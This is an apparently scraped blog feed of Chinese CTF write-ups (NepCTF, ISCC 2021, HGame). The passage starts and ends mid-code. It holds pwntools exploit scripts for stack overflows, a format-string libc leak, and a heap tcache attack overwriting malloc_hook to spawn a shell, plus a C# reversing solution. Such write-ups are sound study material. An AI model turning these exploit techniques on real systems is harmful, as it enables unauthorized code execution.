class="string">&#x27;debug&#x27;</span></span><br><span class="line">p=remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">25812</span>)</span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.29.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">printf_addr = <span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">libc_base = printf_addr - libc.symbols[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">one_gadget = <span class="number">0x106ef8</span></span><br><span class="line">payload = libc_base + one_gadget</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Give me your one gadget:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(payload))</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;One-gadget&quot;&gt;&lt;a href=&quot;#One-gadget&quot; class=&quot;headerlink&quot; title=&quot;One_gadget&quot;&gt;&lt;/a&gt;One_gadget&lt;/h1&gt;</summary>
    
    
    
    <category term="WriteUp" scheme="https://trick.ink/categories/WriteUp/"/>
    
    
    <category term="OneGadget" scheme="https://trick.ink/tags/OneGadget/"/>
    
  </entry>
  
  <entry>
    <title>NepCTF</title>
    <link href="https://trick.ink/article/NepCTF/"/>
    <id>https://trick.ink/article/NepCTF/</id>
    <published>2021-09-28T19:45:18.644Z</published>
    <updated>2021-07-24T06:32:56.781Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><span id="more"></span><h2 id="xhh"><a href="#xhh" class="headerlink" title="xhh"></a>xhh</h2><p><img src="https://raw.githubusercontent.com/YTrick/image/branch/image/20210322132920.png" alt="20210322132920"></p><p>栈溢出，填充0x10，然后找到system cat flag函数，据地址随机化后字节不变，小端更改地址，当图片刷到小蝌蚪的图案便getshell</p><p>exp:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.arch &#x3D; &#39;amd64&#39;</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line"></span><br><span class="line">#p &#x3D; process(&#39;.&#x2F;xhh&#39;)</span><br><span class="line">p &#x3D; remote(&#39;node2.hackingfor.fun&#39;,35402 )</span><br><span class="line">#p &#x3D; remote(&#39;127.0.0.1&#39;,12345)</span><br><span class="line"></span><br><span class="line">payload &#x3D; p64(0) + p64(1) + b&quot;\xE1&quot;</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h1><h2 id="hardcsharp"><a href="#hardcsharp" class="headerlink" title="hardcsharp"></a>hardcsharp</h2><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    AesClass class2 = <span class="keyword">new</span> AesClass();</span><br><span class="line">    <span class="built_in">string</span> key = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="built_in">string</span> strB = <span class="string">&quot;1Umgm5LG6lNPyRCd0LktJhJtyBN7ivpq+EKGmTAcXUM+0ikYZL4h4QTHGqH/3Wh0&quot;</span>;</span><br><span class="line">    <span class="built_in">byte</span>[] buffer = <span class="keyword">new</span> <span class="built_in">byte</span>[] &#123; </span><br><span class="line">        <span class="number">0x51</span>, <span class="number">0x52</span>, <span class="number">0x57</span>, <span class="number">0x51</span>, <span class="number">0x52</span>, <span class="number">0x57</span>, <span class="number">0x44</span>, <span class="number">0x5c</span>, <span class="number">0x5e</span>, <span class="number">0x56</span>, <span class="number">0x5d</span>, <span class="number">0x12</span>, <span class="number">0x12</span>, <span class="number">0x12</span>, <span class="number">0x12</span>, <span class="number">0x12</span>,</span><br><span class="line">        <span class="number">0x12</span>, <span class="number">0x12</span>, <span class="number">0x12</span>, <span class="number">0x12</span>, <span class="number">0x12</span>, <span class="number">0x12</span>, <span class="number">0x12</span>, <span class="number">0x12</span>, <span class="number">0x12</span>, <span class="number">0x12</span>, <span class="number">0x12</span>, <span class="number">0x12</span>, <span class="number">0x12</span>, <span class="number">0x12</span>, <span class="number">0x12</span>, <span class="number">0x12</span></span><br><span class="line">    &#125;;</span><br><span class="line">    Console.WriteLine(<span class="string">&quot;Welcome to nepnep csharp test! plz input the magical code:&quot;</span>);</span><br><span class="line">    <span class="built_in">string</span> str = Console.ReadLine();</span><br><span class="line">    <span class="keyword">if</span> (str.Length != <span class="number">0x25</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        Console.WriteLine(<span class="string">&quot;Nope!&quot;</span>);</span><br><span class="line">        Console.ReadKey();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ((str.Substring(<span class="number">0</span>, <span class="number">4</span>) != <span class="string">&quot;Nep&#123;&quot;</span>) || (str[<span class="number">0x24</span>] != <span class="string">&#x27;&#125;&#x27;</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        Console.WriteLine(<span class="string">&quot;Nope!&quot;</span>);</span><br><span class="line">        Console.ReadKey();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x20</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            key = key + Convert.ToChar((<span class="built_in">int</span>) (buffer[i] ^ <span class="number">0x33</span>)).ToString();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">string</span>.Compare(class2.AesEncrypt(str, key), strB) == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            Console.WriteLine(<span class="string">&quot;wow, you pass it!&quot;</span>);</span><br><span class="line">            Console.ReadKey();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            Console.WriteLine(<span class="string">&quot;Nope!&quot;</span>);</span><br><span class="line">            Console.ReadKey();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反编译出c#代码</p><p>写exp：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a &#x3D; [0x51, 0x52, 0x57, 0x51, 0x52, 0x57, 0x44, 0x5c, 0x5e, 0x56, 0x5d, 0x12, 0x12, 0x12, 0x12, 0x12,</span><br><span class="line">        0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12]</span><br><span class="line"></span><br><span class="line">for i in range(len(a)):</span><br><span class="line">    print(chr(a[i] ^ 0x33),end&#x3D;&quot;&quot;)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">λ python3 test.py</span><br><span class="line">badbadwomen!!!!!!!!!!!!!!!!!!!!!</span><br></pre></td></tr></table></figure><p>Aes加密网站一波：</p><p><img src="https://raw.githubusercontent.com/YTrick/image/branch/image/20210322133852.png" alt="20210322133852"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Pwn&quot;&gt;&lt;a href=&quot;#Pwn&quot; class=&quot;headerlink&quot; title=&quot;Pwn&quot;&gt;&lt;/a&gt;Pwn&lt;/h1&gt;</summary>
    
    
    
    <category term="比赛WriteUp" scheme="https://trick.ink/categories/%E6%AF%94%E8%B5%9BWriteUp/"/>
    
    
  </entry>
  
  <entry>
    <title>ISCC_2021</title>
    <link href="https://trick.ink/article/ISCC_2021/"/>
    <id>https://trick.ink/article/ISCC_2021/</id>
    <published>2021-09-28T19:45:18.615Z</published>
    <updated>2021-07-24T06:33:00.854Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ISCC-2021"><a href="#ISCC-2021" class="headerlink" title="ISCC_2021"></a>ISCC_2021</h1><span id="more"></span><h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="M78"><a href="#M78" class="headerlink" title="M78"></a>M78</h2><p>保护</p><p><img src="/article/ISCC_2021/image-20210526132438302.png" alt="image-20210526132438302"></p><p>ida</p><p>给了 system(“/bin/sh”)</p><p><img src="/article/ISCC_2021/image-20210526132504575.png" alt="image-20210526132504575"></p><p>漏洞在对 password 的检查 check 函数中</p><p><img src="/article/ISCC_2021/image-20210526132549268.png" alt="image-20210526132549268"></p><p>password 长度限制长度为7，然后 strcpy 到 dest，通过 s 溢出给 dest，达到栈溢出。</p><p>但长度被限制了，无法直接栈溢出。</p><p>想到程序是32bit，strlen函数指取寄存器的低位，而 strcpy函数是直到 ‘\x00’ 才停止。</p><p>我们发送的payload是0x107位就能使得strlen==7。</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time, sys, base64</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./M78&#x27;</span>)</span><br><span class="line"></span><br><span class="line">call_main = <span class="number">0x08049202</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Your choice?&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Please choose a building&#x27;</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x18</span>+<span class="number">4</span>) + p32(call_main)</span><br><span class="line">payload = payload.ljust(<span class="number">0x106</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Please input the password&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="game"><a href="#game" class="headerlink" title="game"></a>game</h2><p>保护</p><p><img src="/article/ISCC_2021/image-20210526180142223.png" alt="image-20210526180142223"></p><p>ida</p><p><img src="/article/ISCC_2021/image-20210526180156262.png" alt="image-20210526180156262"></p><p><img src="/article/ISCC_2021/image-20210526180206793.png" alt="image-20210526180206793"></p><p>c语言写程序跑一遍</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a,b;</span><br><span class="line">    srand(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">10</span>;i++)&#123;</span><br><span class="line">        a = rand();</span><br><span class="line">        srand(a);</span><br><span class="line">        b = rand()%<span class="number">100</span>+<span class="number">1</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d,&quot;</span>,b); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/article/ISCC_2021/image-20210526182640652.png" alt="image-20210526182640652"></p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time, sys, base64</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./game&#x27;</span>)</span><br><span class="line"></span><br><span class="line">s = [<span class="number">55</span>,<span class="number">15</span>,<span class="number">82</span>,<span class="number">1</span>,<span class="number">98</span>,<span class="number">68</span>,<span class="number">67</span>,<span class="number">15</span>,<span class="number">86</span>,<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x28</span> + p32(<span class="number">1</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Your name is :&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Guess Number:&#x27;</span>,<span class="built_in">str</span>(s[i]))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="box"><a href="#box" class="headerlink" title="box"></a>box</h2><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time, sys, base64</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;39.96.88.40&#x27;</span>,<span class="number">7020</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index,length,data</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Input the index:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Input the size:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(length))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Input data:&#x27;</span>)</span><br><span class="line">    p.sendline(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,data</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Input the index:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Please input the data:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(data))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Input the index:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Input the index:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x78</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Here is it :&#x27;</span>)</span><br><span class="line">heap = u64(p.recv(<span class="number">6</span>)+<span class="string">&#x27;\x00\x00&#x27;</span>)-<span class="number">0x260</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(heap)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,p64(heap+<span class="number">0x10</span>))</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x78</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x78</span>,<span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="string">&#x27;\xff&#x27;</span>*<span class="number">8</span>*<span class="number">20</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Here is it :&#x27;</span>)</span><br><span class="line">main = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">96</span></span><br><span class="line">malloc_hook = main - <span class="number">0x10</span></span><br><span class="line">libc = main - <span class="number">0x3ebc40</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(main)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(malloc_hook)</span><br><span class="line"></span><br><span class="line">one_gadget=[<span class="number">0x4f2c5</span>,<span class="number">0x4f322</span>,<span class="number">0x10a38c</span>]</span><br><span class="line">edit(<span class="number">2</span>,<span class="string">&#x27;\x01&#x27;</span>*<span class="number">8</span> + p64(<span class="number">0</span>)*<span class="number">7</span> + p64(<span class="number">0</span>) + p64(malloc_hook))</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x20</span>,p64(libc+<span class="number">0x10a38c</span>))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input the index:&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input the size:&#x27;</span>,<span class="string">&#x27;0x20&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;ISCC-2021&quot;&gt;&lt;a href=&quot;#ISCC-2021&quot; class=&quot;headerlink&quot; title=&quot;ISCC_2021&quot;&gt;&lt;/a&gt;ISCC_2021&lt;/h1&gt;</summary>
    
    
    
    <category term="比赛WriteUp" scheme="https://trick.ink/categories/%E6%AF%94%E8%B5%9BWriteUp/"/>
    
    
  </entry>
  
  <entry>
    <title>HGame</title>
    <link href="https://trick.ink/article/HGame/"/>
    <id>https://trick.ink/article/HGame/</id>
    <published>2021-09-28T19:45:18.592Z</published>
    <updated>2021-07-24T06:33:04.180Z</updated>
    
    <content type="html"><![CDATA[<h1 id="week1"><a href="#week1" class="headerlink" title="week1"></a>week1</h1><span id="more"></span><h2 id="once-格式化字符串"><a href="#once-格式化字符串" class="headerlink" title="once(格式化字符串)"></a>once(格式化字符串)</h2><p><img src="https://raw.githubusercontent.com/YTrick/image/branch/image/20210306191440.png" alt="20210306191440"></p><p>IDA看，明显是格式化字符串漏洞，显然是⽤来 leak （泄露地址） 的了，泄露出 libc 的地址，就能计算出 onegadget 的地址了，最后覆盖返回地址，使得返回到 onegadget 就能拿到 shell</p><p>但是这不能⼀次就完成，要分两步，第⼀次利⽤要先 leak，覆盖返回地址，返回到漏洞开始的地⽅（这里就是程序的 vuln 函数），第⼆次就覆盖返回地址成 onegadget 即可</p><p>在第⼀步呢，有⼀个关键点，地址随机化的最低 12 bit，是不会变的，所以只要覆盖最低的 1 个字节，就可以返回到其它相近的地⽅，⽐如 vuln 函数的开头，</p><p>我用[tag]的方法找字符串的偏移老找不准：</p><p><img src="https://raw.githubusercontent.com/YTrick/image/branch/image/20210306191649.png" alt="20210306191649"></p><p>如果想要找到栈中一些函数的地址来计算偏移的时候，不知道break在printf处后，栈中第一个值到底是第几个参数，所以我用了IDA去找。</p><p>test_exp:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;zsh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">12345</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;AAAA&#x27;</span>  + <span class="string">&#x27;%1$p&#x27;</span> +<span class="string">&#x27;%2$p&#x27;</span> +  <span class="string">&#x27;%3$p&#x27;</span> +<span class="string">&#x27;%4$p&#x27;</span> +  <span class="string">&#x27;%5$p&#x27;</span>    + <span class="string">&#x27;%6$p&#x27;</span>  + <span class="string">&#x27;%13$p&#x27;</span>  + <span class="string">&#x27;%14$p&#x27;</span></span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&#x27;It is your turn: &#x27;</span>,payload)</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/YTrick/image/branch/image/20210307140046.png" alt="20210307140046"></p><p><img src="https://raw.githubusercontent.com/YTrick/image/branch/image/20210307140246.png" alt="20210307140246"></p><p>可以看到第13个参数是一个 libc_start_main 的地址，利用这个地址与题目给的 libc 文件就可以计算出 onegadget </p><p>最后的 getshell 中 +0x4f3d5 用 one_gadget [libcname] 指令</p><p><img src="https://raw.githubusercontent.com/YTrick/image/branch/image/20210308133927.png" alt="20210308133927"></p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;zsh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">context.log_level = <span class="string">&#x27;info&#x27;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;182.92.108.71&#x27;</span>,<span class="number">30107</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./once&#x27;)</span></span><br><span class="line"><span class="comment">#p = remote(&#x27;127.0.0.1&#x27;,12345)</span></span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>, checksec=<span class="literal">False</span>)</span><br><span class="line">binary = ELF(<span class="string">&#x27;./once&#x27;</span>, checksec=<span class="literal">False</span>)</span><br><span class="line">payload = <span class="string">&#x27;%13$p\n&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x28</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">payload +=   <span class="string">&#x27;\xD3&#x27;</span> </span><br><span class="line">p.sendafter(<span class="string">&#x27;It is your turn: &#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">libc_addr = p.recvuntil(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;True&#x27;</span>)</span><br><span class="line">libc_addr = <span class="built_in">int</span>(libc_addr,<span class="number">16</span>)</span><br><span 